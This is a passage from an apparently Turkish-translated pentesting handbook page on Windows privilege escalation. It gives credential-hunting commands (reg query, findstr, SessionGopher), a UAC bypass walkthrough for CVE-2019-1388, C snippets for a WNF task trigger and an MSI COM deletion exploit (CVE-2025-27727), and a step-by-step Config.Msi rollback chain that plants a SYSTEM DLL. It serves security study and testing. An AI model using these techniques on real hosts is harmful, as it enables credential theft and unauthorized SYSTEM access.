varlığını kanıtlamaz. Özel anahtar malzemesini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, politikayı ve zamanlanmış komutu inceleyin.

Kimlik bilgilerine dair ipuçları için erişilebilir mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları da inceleyin. BitLocker kurtarma anahtarı dışa aktarımı HTML veya TXT olarak, bazen de adı belli bir yedek arşivinin içinde saklanmış olabilir. Bu tür materyaller, daha eski yedekleri içeren ayrı bir şifrelenmiş veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa, çevrimdışı etki alanı kimlik bilgilerinin kurtarılması için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim, kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin bulunduğunu tek başına kanıtlamaz.

Çeşitli programlarda kayıtlı **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry içinde

**Kimlik bilgileri içerebilecek diğer olası registry anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den openssh anahtarlarını çıkarma.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
**Chrome, Edge veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini de kontrol edin; bazı **parolalar burada** depolanmış olabilir.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumunda; `Local State` ise üst dizin olan `User Data` içinde bulunur. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların mevcut olması yalnızca kimlik bilgisi deposuna dair bir ipucudur: dosyaların okunabilir olduğunu, ilgili kullanıcının DPAPI bağlamına veya başka bir yetkili anahtar materyaline erişildiğini ve kaydedilmiş oturum açma bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmanız veya şifresi çözülmüş parolaları yazdırmanız gerekmez.

Firefox için [Mozilla, bir profilin `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğunu belgeliyor](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile). Bu dosyaların mevcut olması yalnızca bir ipucudur: her iki dosyanın da okunabilir olup olmadığını, kaydedilmiş girdilerin bulunup bulunmadığını ve kimlik bilgilerinin kullanılabilir olduğuna karar vermeden önce Ana Parolanın anahtarı koruyup korumadığını kontrol edin. Kurtarılan bir kimlik bilgisi etki alanı hesabına aitse, bu hesabın etkin grup denetimi haklarını ve grubun [LAPS parola okuma veya şifre çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına bir yönetici erişim yolu oluşturmaz.

Tarayıcılardan parola çıkarmaya yönelik araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerde yazılmış yazılım bileşenleri arasında **iletişimi** sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **sınıf kimliği (CLSID) ile tanımlanır** ve her bileşen, arayüz kimlikleri (IID'ler) ile tanımlanan bir veya daha fazla arayüz üzerinden işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur ve **HKEY\CLASSES\ROOT** konumunda yer alır.

Bu kayıt defterindeki CLSID'lerin içinde, **DLL** dosyasını gösteren bir **varsayılan değer** ve **ThreadingModel** adlı bir değer içeren **InProcServer32** alt anahtarını bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Tek İş Parçacıklı), **Free** (Çok İş Parçacıklı), **Both** (Tek veya Çok İş Parçacıklı) ya da **Neutral** (İş Parçacığından Bağımsız) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterindeki CLSID'lerin içinde, DLL dosyasını gösteren bir varsayılan değer ve bir değer... içeren InProcServer32 alt anahtarını bulabilirsiniz](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL dosyalarından herhangi birinin üzerine yazabilirseniz**, farklı bir kullanıcı tarafından çalıştırılması durumunda **yetki yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola arama**

**Dosya içeriklerinde arama yapın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir ada sahip dosyayı arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Anahtar adları ve parolalar için kayıt defterinde arama yapın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** eklentisidir. Bu eklentiyi, kurbanın içinde kimlik bilgilerini arayan her metasploit POST modülünü **otomatik olarak çalıştırması** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri düz metin olarak kaydeden çeşitli araçlardaki **oturumları**, **kullanıcı adlarını** ve **parolaları** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Bir **SYSTEM olarak çalışan bir process'in yeni bir process'i** (`OpenProcess()`) **tam erişimle açtığını** hayal edin. Aynı process, **ana process'in tüm açık handle'larını devralan, düşük ayrıcalıklara sahip yeni bir process de oluşturur** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **ayrıcalıklı process'e ait açık handle'ı alabilir** ve **shellcode enjekte edebilirsiniz**.\
Bu güvenlik açığının **nasıl tespit edilip istismar edileceği** hakkında daha fazla bilgi için [bu örneği inceleyin](leaked-handle-exploitation.md).\
Farklı izin seviyeleriyle devralınan process ve thread'lere ait daha fazla açık handle'ın nasıl test edilip kötüye kullanılacağına dair daha kapsamlı bir açıklama için [bu diğer yazıyı okuyun](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşılan bellek segmentleri, process'ler arasında iletişim ve veri aktarımını sağlar.

Windows, birbiriyle ilişkili olmayan process'lerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı oluşturan **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** tespit etmek, oluşturduğunuz pipe ile etkileşime girdiğinde bu process'in kimliğine bürünerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Bu saldırının nasıl gerçekleştirileceğine ilişkin faydalı kılavuzları [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulabilirsiniz.

Ayrıca, aşağıdaki araç [**burp gibi bir araçla named pipe iletişimini yakalamanızı sağlar:**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Sunucu modundaki Telephony service (TapiSrv), `\\pipe\\tapsrv`'yi (MS-TRP) kullanıma açar. Uzak bir kimliği doğrulanmış client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya yönelik rastgele bir **4-byte write** işlemine dönüştürebilir; ardından Telephony admin hakları elde edip service olarak rastgele bir DLL yükleyebilir. Tam akış:

- `pszDomainUser` değerini yazılabilir mevcut bir yol olarak ayarlayarak `ClientAttach` çağrısı yapın → service, bu dosyayı `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki saldırgan kontrollü `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, ardından deterministik yazımları tekrarlamak için kaydı silin/kapatın.
- `C:\Windows\TAPI\tsec.ini` dosyasındaki `[TapiAdministrators]` bölümüne kendinizi ekleyin, yeniden bağlanın ve `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırmak için rastgele bir DLL yolu ile `GetUIDllName` çağrısı yapın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta stuff çalıştırabilen file extension'lar

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir şema) tetikleyebilir ve saldırgan kontrollü dosyaları mevcut kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Şifreler için Command Line'ları izleme**

Bir kullanıcı olarak shell elde ettiğinizde, **kimlik bilgilerini command line üzerinden ileten** zamanlanmış görevler veya çalıştırılan başka process'ler olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları çıktılar.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Processlerden parola çalma

## Düşük yetkili kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde yetkisiz bir kullanıcıdan "NT\AUTHORITY SYSTEM" olarak bir terminal veya başka herhangi bir işlem çalıştırmak mümkündür.

Bu, aynı güvenlik açığıyla hem ayrıcalıkları yükseltmeyi hem de UAC'yi atlatmayı mümkün kılar. Ayrıca herhangi bir şey yüklemek gerekmez ve işlem sırasında kullanılan ikili dosya Microsoft tarafından imzalanıp yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları uygulamak gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'ları** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junction'ları

Bir uygulama, tahmin edilebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı dosya adını buraya yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp yerine bir NTFS junction koyabiliyorsa, yazma işlemi junction'ı izleyerek web sunucusunun sunduğu bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web-service kimliğiyle çalışabilir. Bu, uygulamaya özgü bir arbitrary-write sınırıdır; yalnızca yazılabilir bir upload dizininin veya mevcut bir junction'ın bulunması bunu kanıtlamaz.

Upload handler'daki tam path oluşturma ve zamanlamayı, kullanıcının alt dizin üzerindeki etkin silme/oluşturma haklarını, hedefin etkin ACL'lerini, yazıcının reparse point'leri izleyip izlemediğini ve web sunucusunun hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazıcının ve web sunucusunun process identity değerlerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya gelecekte yapılacak bir junction değişimini doğrulayamaz. Çalıştırma bir service account kimliğiyle gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## WNF ile tetiklenen ayrıcalıklı scheduled-task temizliği

Elle çalıştırmayı reddeden bir scheduled task, yine de ayrıcalıksız bir tetikleme yolu sunabilir. Ayrıcalıklı bir task'ı denetlerken XML'ini dışa aktarın ve task DACL'sinin, principal'ının ve action'ının yanı sıra **tüm** tetikleyicileri inceleyin. Özellikle, bir `WnfStateChangeTrigger` bir Windows Notification Facility (WNF) state'i belirtir; bu güvenli state mevcut kullanıcının bir güncelleme yayımlamasına izin veriyorsa, kullanıcı `<AllowStartOnDemand>false</AllowStartOnDemand>` olmasına rağmen task'ı yapılandırılmış kimliği altında dolaylı olarak başlatabilir.<sup>[[43]](#references)</sup>

Örneğin Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task'ı SYSTEM olarak çalışıyordu, standart bir kullanıcının WNF state `7508BCA32C079E41` için güncelleme yapmasını kabul ediyordu ve Recall devre dışı olsa bile `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` yolunu inceliyordu.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Erişilebilirliği test etmek için `ZwUpdateWnfStateData` işlevini `ntdll.dll` dosyasından çözümleyin, sekiz baytlık durum adı için boş bir güncelleme gönderin ve dönüş durumunu görevin son çalıştırma verileri veya Procmon etkinliğiyle karşılaştırın. Aşağıdaki basitleştirilmiş yoklama, Recall görevi örneğindeki bayt dizisini kullanır; test ettiğiniz görev için dışa aktarılan baytları kullanın.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Özyinelemeli temizliği ayrıcalıklı silmeye dönüştürme

İşe yarayan primitive yalnızca tetikleyici değil, saldırganın kontrolündeki bir dizini kabul eden ayrıcalıklı bir temizleme yordamıdır. İşlemi numaralandırmadan son değişikliğe kadar izleyin: profil/oturum keşfi, wildcard ile seçilen alt öğeler, `SHCreateItemFromParsingName` ve `IFileOperation::DeleteItem`, daha önce denetlenmiş bir yol adının daha sonra özyinelemeli olarak dolaşılacağının güçlü göstergeleridir. Alt öğeler güvenilir dizin tanıtıcılarına göre açılıp silinmeden önce doğrulanmıyorsa saldırgan, numaralandırma ile kullanım arasında yol çözümlemesini değiştirebilir.<sup>[[43]](#references)</sup>

WNF tetikleyicisini aşağıda açıklanan [oplock, junction ve Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) ile eşleştirin: oplock, temizleyici meşru alt öğeyi seçtikten sonra işlemi duraklatırken yazılabilir üst dizin değiştirilir; böylece ayrıcalıklı silme sürdüğünde `\RPC Control` üzerinden korunan hedefe yönelir. Recall zincirinde bu, belgelenmiş MSI rollback tekniği için gereken `C:\Config.Msi` dizininin SYSTEM tarafından silinmesini sağladı.<sup>[[31]](#references)[[43]](#references)</sup>

### İç içe alt öğeler yüzeysel reparse point düzeltmelerini atlatır

Yalnızca saldırganın kontrolündeki kök dizini ve doğrudan alt öğesini doğrulamak, yol adı tabanlı özyinelemeli silme işlemini güvenli hâle getirmez. Denetlenen nesneleri meşru tutup junction/oplock substitution işlemini bunların altındaki ek bir alt öğeye taşıyın; `IFileOperation::DeleteItem` sonunda doğrulanmamış alt öğeye ulaşır ve onun yeni hedefini izler. İlk Recall yaması `UKP` ile GUID biçimli dizini doğrulayıp eski özyinelemeli silme işlemini koruduğundan CVE-2026-20941 tam olarak bu tür eksik bir düzeltmeyle ortaya çıktı.<sup>[[43]](#references)</sup>

Güvenli yaklaşım, **her alt öğeyi** önceden güvenilen bir dizin tanıtıcısına göre açmak, nihai çözümlenen yolu/nesneyi alıp doğrulamak ve silme durumunu bu doğrulanmış tanıtıcıya uygulamaktır. Bir öneki doğrulayıp ardından yol adı tabanlı özyinelemeli silmeye geri dönmeyin. Yama incelemesi sırasında gerçek çağrı noktasındaki yapıları da inceleyin: bu durumda `NtCreateFile` sırasında `OBJECT_ATTRIBUTES` yapısının çalışma zamanı incelemesi, `RootDirectory` değerinin null olmadığını ve göreli `{GUID}\\secure_file.lock` adını göstererek ikinci bir `FILE_DELETE_ON_CLOSE` primitive’ini ima eden yanıltıcı decompiler çıktısını çürüttü.<sup>[[43]](#references)</sup>

## Keyfi Klasör Silme/Taşıma/Yeniden Adlandırma ile SYSTEM EoP

Teknik, [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanmıştır; exploit kodu [**burada**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) mevcuttur.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanmaya dayanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir. Windows Installer, bu klasörü daha sonra diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanır; bu dosyalar da kötü amaçlı payload içerecek şekilde değiştirilmiş olur.

### Windows Installer COM temizleme yolu enjeksiyonu (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM `msiexec.exe` hizmetine erişebilir. Tersine mühendislik, ilgili `IMsiServer` çağrılarının vtable offset `0xA0` konumundaki `MsiBeginTransactionW`, `0xC8` konumundaki `SetEEUIDirectoryAndFilter` ve `0x50` konumundaki `CleanupTempPackages` olduğunu ortaya çıkardı. Bu adlar ve offset’ler tersine mühendislikle belirlenmiştir ve derlemeler arasında değişebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken yalnızca çağıranı impersonate eder. Bu, çağıranın dizini silebildiğini kanıtlar ve bir reparse point’in izlenmesini önler; ancak denetlenen dosya nesnesini sonraki temizleme işlemine bağlamaz veya dosyanın Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, çağıranın filtre argümanından bağımsız olarak yolu klasör şeklinde zamanlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın kontrolündeki yoldur ve `0x00000002` verisi klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan temizleme işlemine girer. Yükseltilmiş çalışan, kayıt defteri değerlerini numaralandırır ve klasör girdilerini yolun kökenini denetlemeden özyinelemeli `FDeleteFolder` yordamına iletir. Normal kaldırma başarısız olursa kod ayrıca `LockdownPath` çağırır, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından elde edilen en kısa çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Yararlı primitive, junction yönlendirmesi yerine path'in yeniden kullanılmasıdır. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedin, silin ve Windows Installer'ın daha sonra korumalı rollback verileriyle aynı yolu yeniden oluşturmasını sağlayın. Temizleme işlemi, eski `TempPackages` adına güvenir ve yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden bu yöntem, `FILE_FLAG_OPEN_REPARSE_POINT` ve yönlendirme güven azaltımının amaçlanan sınırını aşar.<sup>[[41]](#references)</sup>

Bu silme primitive'i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL'yi sıkılaştırmadan önce `WRITE_DAC` izniyle açılmış bir handle'ı elinizde tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin verici bir DACL'yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkin olduğunda `CMsiTransaction::SetEEUIDirectoryAndFilter` işlevinin `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu yolu düzeltti. COM çağrısı yine de başarılı dönebilir, ancak saldırganın denetimindeki yolu artık `TempPackages` içine eklemez. Yama testinde yöntemin başarılı dönüşünü kullanmak yerine Nisan 2025 Windows güvenlik güncellemelerini uygulayın.<sup>[[41]](#references)[[42]](#references)</sup>

Özetlenen teknik şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` dizinini boş bırakma)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Yönetici olmayan bir kullanıcının** çalıştırabilmesi için installer'ı **"UAC Compliant"** olarak işaretleyin.
    - Yüklemeden sonra dosyaya ait bir **handle**'ı açık tutun.

- Adım 2: Kaldırma işlemini başlatın
    - Aynı `.msi` dosyasını kaldırın.
    - Kaldırma işlemi dosyaları `C:\Config.Msi` dizinine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosya `C:\Config.Msi\<random>.rbf` olduğunda bunu tespit etmek için açık dosya handle'ını **`GetFinalPathNameByHandle` ile yoklayın**.

- Adım 3: Özel senkronizasyon
    - `.msi`, şu işlemleri yapan bir **özel kaldırma eylemi (`SyncOnRbfWritten`)** içerir:
        - `.rbf` dosyasının yazıldığını bildirir.
        - Ardından kaldırma işlemine devam etmeden önce başka bir olay üzerinde **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Bildirim geldiğinde, **`FILE_SHARE_DELETE` olmadan `.rbf` dosyasını açın** — bu, dosyanın **silinmesini engeller**.
    - Ardından kaldırma işleminin tamamlanabilmesi için **yanıt sinyali gönderin**.
    - Windows Installer `.rbf` dosyasını silemez; tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - Siz (saldırgan) `.rbf` dosyasını elle silin.
    - Artık **`C:\Config.Msi` boş** ve ele geçirilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM düzeyindeki rastgele klasör silme zafiyetini tetikleyin**.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL'lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` iznine sahip bir handle'ı **açık tutun**.

- Adım 7: Başka bir yükleme çalıştırın
    - `.msi` dosyasını yeniden yükleyin. Şunları kullanın:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu hatayı tetikleyen bir değişken.
    - Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını kaydedin.

- Adım 9: Rollback öncesinde senkronize edin
    - `.msi`, şu işlemleri yapan bir **özel yükleme eylemi (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir olayı bildirir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'leri yeniden uygulayın
    - `.rbs created` olayını aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` dizinine **yeniden güçlü ACL'ler uygular**.
        - Ancak `WRITE_DAC` iznine sahip bir handle hâlâ elinizde olduğundan **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken uygulanır**, dolayısıyla klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
    - `.rbs` dosyasını, Windows'a şunları yaptıran **sahte bir rollback script'i** ile üzerine yazarak değiştirin:
        - `.rbf` dosyanızı (kötü amaçlı DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemek.
    - **Kötü amaçlı SYSTEM düzeyinde payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback işlemini tetikleyin
    - Installer'ın devam etmesi için senkronizasyon olayını bildirin.
    - Yüklemenin bilinen bir noktada **kasten başarısız olmasını** sağlayan bir type 19 özel eylemi (`ErrorOut`) yapılandırılmıştır.
    - Bu, **rollback işlemini başlatır**.

- Adım 13: SYSTEM DLL'inizi yükler
    - Windows Installer:
        - Kötü amaçlı `.rbs` dosyanızı okur.
        - `.rbf` DLL'inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir konumda kötü amaçlı DLL'iniz** vardır.

- Son Adım: SYSTEM kodunu çalıştırın
